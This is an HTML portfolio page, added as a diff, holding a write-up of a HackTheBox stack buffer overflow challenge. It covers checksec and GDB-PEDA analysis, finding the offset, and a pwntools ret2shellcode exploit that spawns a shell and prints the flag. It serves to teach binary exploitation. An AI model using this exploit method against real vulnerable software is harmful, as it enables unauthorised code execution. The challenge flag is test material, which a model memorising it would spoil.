@@ -1,0 +1,146 @@
+<a href="/portfolio" class="back-btn">← back to portfolio</a>
+<div class="detail-meta">
+  <span class="featured-badge">Featured</span>
+  <span class="card-date" style="font-family:var(--portfolio-mono),monospace;font-size:12px;color:var(--pf-text-dim)">Dec 2025</span>
+</div>
+<h1 class="detail-title">CTF: Stack Buffer Overflow Exploit</h1>
+<p class="detail-subtitle">Full write-up for a HackTheBox Pwn challenge requiring exploitation of a classic stack-based buffer overflow. Covers binary analysis with checksec and GDB-PEDA, offset calculation, return address control, and shellcode injection to achieve remote code execution.</p>
+<div class="detail-tags">
+  <span class="detail-tag">Binary Exploitation</span>
+  <span class="detail-tag">GDB / PEDA</span>
+  <span class="detail-tag">pwntools</span>
+  <span class="detail-tag">x86-64 Assembly</span>
+  <span class="detail-tag">Shellcoding</span>
+</div>
+
+<div class="writeup">
+
+<div class="info-grid">
+  <div class="info-cell"><div class="label">// platform</div><div class="value">HackTheBox</div></div>
+  <div class="info-cell"><div class="label">// category</div><div class="value">Pwn / Binary</div></div>
+  <div class="info-cell"><div class="label">// arch</div><div class="value">x86-64 Linux</div></div>
+  <div class="info-cell"><div class="label">// protections</div><div class="value">None (intentional)</div></div>
+</div>
+
+<h2>01 — Binary Analysis</h2>
+<p>The challenge provides a single ELF binary. First step is always to understand what protections are in place before deciding on an attack strategy.</p>
+
+<div class="code-block">
+$ file pwn_challenge
+pwn_challenge: ELF 64-bit LSB executable, x86-64, not stripped
+
+$ checksec --binary pwn_challenge
+<span class="highlight">[*] Arch:     amd64-64-little
+[*] RELRO:    No RELRO
+[*] Stack:    No canary found
+[*] NX:       NX disabled
+[*] PIE:      No PIE</span>
+</div>
+
+<div class="finding-box">
+  <div class="finding-label">// analysis</div>
+  <p>No stack canary means we can overwrite the return address. NX disabled means the stack is executable, so we can inject shellcode directly. No PIE means addresses are static — no ASLR bypass needed. Classic ret2shellcode scenario.</p>
+</div>
+
+<h2>02 — Static Analysis</h2>
+<p>Disassembling the <code>main()</code> function reveals the vulnerable code path:</p>
+
+<div class="code-block">
+$ objdump -d pwn_challenge | grep -A 30 "&lt;main&gt;"
+
+<span class="comment">; main calls vuln_func()</span>
+0x0000000000401156 &lt;+0&gt;:  push   rbp
+0x0000000000401157 &lt;+1&gt;:  mov    rbp,rsp
+0x000000000040115a &lt;+4&gt;:  sub    rsp,0x40     <span class="highlight">; 64 byte buffer allocated</span>
+0x000000000040115e &lt;+8&gt;:  lea    rax,[rbp-0x40]
+0x0000000000401162 &lt;+12&gt;: mov    rdi,rax
+0x0000000000401165 &lt;+15&gt;: call   0x401030 <span class="string">&lt;gets@plt&gt;</span>  <span class="highlight">; vulnerable! no bounds check</span>
+</div>
+
+<p>The function uses <code>gets()</code> — the classic vulnerable C function that reads until a newline with no length limit, making it trivially exploitable.</p>
+
+<h2>03 — Offset Calculation</h2>
+<p>Using GDB with the PEDA plugin to find the exact number of bytes needed to reach the saved return address on the stack:</p>
+
+<div class="code-block">
+$ gdb -q pwn_challenge
+gdb-peda$ checksec
+gdb-peda$ pattern create 200
+<span class="string">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1...</span>
+
+gdb-peda$ run
+<span class="comment">Starting program...
+Enter your name: [paste pattern]
+Program received signal SIGSEGV</span>
+
+gdb-peda$ pattern search
+<span class="highlight">Registers contain pattern buffer:
+RBP+0 found at offset: 64
+RIP+0 found at offset: 72</span>
+</div>
+
+<div class="finding-box">
+  <div class="finding-label">// result</div>
+  <p>The return address (RIP) is at offset 72. We need 72 bytes of padding, then our 8-byte return address to redirect execution.</p>
+</div>
+
+<h2>04 — Finding a Return Target</h2>
+<p>Since NX is disabled, we can place shellcode in the buffer and jump to it. We need the stack address where our input lands. With no PIE/ASLR:</p>
+
+<div class="code-block">
+gdb-peda$ break *vuln_func
+gdb-peda$ run
+gdb-peda$ i r rsp
+
+<span class="comment">rsp            0x7fffffffde80  </span><span class="highlight">0x7fffffffde80</span>
+<span class="comment">; buffer starts here — shellcode lands here</span>
+</div>
+
+<h2>05 — Writing the Exploit</h2>
+<p>Final exploit written with pwntools. Payload structure: <strong>shellcode + padding to offset + return address pointing back to start of buffer</strong>.</p>
+
+<div class="code-block">
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+<span class="comment"># Setup</span>
+binary = ELF(<span class="string">'./pwn_challenge'</span>)
+p = process(<span class="string">'./pwn_challenge'</span>)
+
+<span class="comment"># x86-64 execve("/bin/sh") shellcode</span>
+shellcode = asm(shellcraft.amd64.linux.sh())
+
+offset = 72
+buf_addr = 0x7fffffffde80  <span class="comment"># from GDB</span>
+
+payload  = shellcode
+payload += b<span class="string">'A'</span> * (offset - len(shellcode))
+payload += p64(buf_addr)
+
+p.sendlineafter(<span class="string">b'Enter your name: '</span>, payload)
+p.interactive()
+</div>
+
+<h2>06 — Shell Achieved</h2>
+
+<div class="code-block">
+$ python3 exploit.py
+
+<span class="comment">[+] Starting local process './pwn_challenge': pid 12345
+[*] Switching to interactive mode</span>
+
+<span class="highlight">$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ cat flag.txt
+HTB{r3t_2_sh3llc0d3_cl4ss1c}</span>
+</div>
+
+<h2>07 — Key Takeaways</h2>
+<ul>
+  <li>Always run <strong>checksec</strong> first — it immediately reveals which bypass techniques are needed</li>
+  <li><strong>Pattern Create/Search</strong> in GDB-PEDA makes offset finding trivial compared to manual binary search</li>
+  <li>When NX is off and no ASLR — ret2shellcode is the fastest path to shell</li>
+  <li>pwntools' <code>shellcraft</code> generates correct shellcode for the target arch automatically</li>
+  <li>For hardened binaries (NX on, canary, PIE) — methodology evolves to ret2libc or ROP chains</li>
+</ul>
+
+</div>
